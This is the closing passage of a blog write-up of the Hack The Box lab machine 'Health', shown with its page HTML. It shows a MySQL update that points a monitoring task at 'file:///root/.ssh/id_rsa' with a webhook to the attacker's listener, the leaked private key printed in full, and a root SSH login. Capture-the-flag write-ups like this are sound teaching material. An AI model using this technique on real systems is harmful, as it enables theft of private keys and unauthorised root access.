</code></pre><p>The &ldquo;<em>monitoredUrl</em>&rdquo; field is being passed into the <em>file_get_contents</em> function so we can modify the task stored in the DB and trick root into fetching his private SSH key for us.</p><h3 id=extract-id_rsa>Extract id_rsa</h3><p>Immediately after creating a new task we confirm that it&rsquo;s in the DB and then we proceed to modify it.</p><pre><code class=language-bash>mysql&gt; update tasks set monitoredUrl = 'file:///root/.ssh/id_rsa';

...(SNIP)...

mysql&gt; select * from tasks;
+--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
| id                                   | webhookUrl               | onlyError | monitoredUrl             | frequency   | created_at          | updated_at          |
+--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
| 28073286-067b-4033-907e-d1e753c2814a | http://10.10.14.34:9001/ |         0 | file:///root/.ssh/id_rsa | */5 * * * * | 2023-02-04 17:14:15 | 2023-02-04 17:14:15 |
+--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
1 row in set (0.00 sec)
</code></pre><p>And after some time we have a hit in our local server.</p><pre><code class=language-bash>{&quot;webhookUrl&quot;:&quot;http:\/\/10.10.14.34:9001\/&quot;,&quot;monitoredUrl&quot;:&quot;file:\/\/\/root\/.ssh\/id_rsa&quot;,&quot;health&quot;:&quot;up&quot;,&quot;body&quot;:&quot;-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n&quot;}
</code></pre><p>We just need to use some jq to extract the data that we want.</p><pre><code class=language-bash>❯ cat root| jq -r .body
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
(...SNIP...)
</code></pre><p>And then log in.</p><pre><code class=language-bash>❯ ssh -i root_key root@health.htb
root@health:~# cat root.txt 
28376d261157e7.........
</code></pre><p>Lux-Sit</p></article><div class=my-4><a href=https://alpharivs.github.io/tags/htb/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#HTB</a>
<a href=https://alpharivs.github.io/tags/ssrf/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#SSRF</a>
<a href=https://alpharivs.github.io/tags/php/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#php</a>
<a href=https://alpharivs.github.io/tags/ctf/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#ctf</a>
<a href=https://alpharivs.github.io/tags/write-up/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#write-up</a>
<a href=https://alpharivs.github.io/tags/gogs/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#gogs</a>
<a href=https://alpharivs.github.io/tags/hacking/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#hacking</a></div><div class=py-2><div class="my-8 flex flex-col items-center md:flex-row"><a href=https://alpharivs.github.io/authors/alpharivs/ class="md:me-4 text-primary-text h-24 w-24"><img src=https://alpharivs.github.io/images/profile.jpg class="bg-primary-bg w-full rounded-full" alt=Avatar></a><div class="mt-4 w-full md:mt-0 md:w-auto"><a href=https://alpharivs.github.io/authors/alpharivs/ class="mb-2 block border-b pb-1 text-lg font-bold"><h3>Alpharivs</h3></a><span class="block pb-2">Eternal Cybersecurity student with love for Malware and CTFs</span>
<a href=mailto:caliburn@tutanota.de class=me-2><i class="fas fa-envelope"></i></a>
<a href=https://twitter.com/alpharivs class=me-2><i class="fab fa-twitter"></i></a>
<a href=https://github.com/Alpharivs class=me-2><i class="fab fa-github"></i></a>
<a href=https://app.hackthebox.com/users/525385 class=me-2><i class="fab fa-jedi-order"></i></a></div></div></div><div class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"><div></div><div class="mt-4 md:mt-0 md:text-right"><span class="text-primary-text block font-bold">Next</span>
<a href=https://alpharivs.github.io/htb_writeups/htb_shared/ class=block>HTB - Shared</a></div></div></div><div class=col-span-2><div class="bg-primary-bg
prose sticky top-16 z-10 hidden px-6 py-4 lg:block"><h3>On This Page</h3></div><div class="sticky-toc hidden px-6 pb-6 lg:block"><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a><ul><li><a href=#host-discovery>Host Discovery</a></li><li><a href=#port-scanning>Port Scanning</a></li></ul></li><li><a href=#website-tcp-80>Website TCP 80</a><ul><li><a href=#exploring-the-website>Exploring the Website</a></li><li><a href=#recon>Recon</a></li><li><a href=#testing-the-webapp>Testing the WebApp</a></li><li><a href=#ssrf>SSRF</a><ul><li><a href=#filter-bypass>Filter Bypass</a></li></ul></li></ul></li><li><a href=#gogs>Gogs</a><ul><li><a href=#database-enumeration>Database Enumeration</a></li></ul></li><li><a href=#crack-the-hash>Crack the Hash</a></li><li><a href=#user-susanne>User Susanne</a><ul><li><a href=#cronjob>CronJob</a></li><li><a href=#enumerating-the-webapp>Enumerating the WebApp</a></li><li><a href=#tasks-table>Tasks Table</a></li></ul></li><li><a href=#root>Root</a><ul><li><a href=#extract-id_rsa>Extract id_rsa</a></li></ul></li></ul></nav></div><script>window.addEventListener("DOMContentLoaded",()=>{enableStickyToc()})</script></div><div class="bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"><h3>See Also</h3><a href=https://alpharivs.github.io/htb_writeups/htb_shared/ class=no-underline>HTB - Shared</a><br><a href=https://alpharivs.github.io/writeups/anode/ class=no-underline>Flare-On 2022 - anode</a><br><a href=https://alpharivs.github.io/writeups/a_la_mode/ class=no-underline>Flare-On 2022 - à la mode</a><br><a href=https://alpharivs.github.io/writeups/challenge_teight/ class=no-underline>Flare-On 2022 - T8</a><br><a href=https://alpharivs.github.io/writeups/darn_mice/ class=no-underline>Flare-On 2022 - darn_mice</a><br><a href=https://alpharivs.github.io/writeups/magic_8_ball/ class=no-underline>Flare-On 2022 - Magic 8 Ball</a><br></div></div><script>document.addEventListener("DOMContentLoaded",()=>{hljs.highlightAll()})</script></div></div></main><footer class=pl-scrollbar><div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b"><p class="text-sm text-tertiary-text">&copy; 2023 <a href=https://twitter.com/alpharivs>Alpharivs</a>
&#183; Powered by the <a href=https://github.com/wangchucheng/hugo-eureka class=hover:text-eureka>Eureka</a> theme for <a href=https://gohugo.io class=hover:text-eureka>Hugo</a></p></div></div></footer></body></html>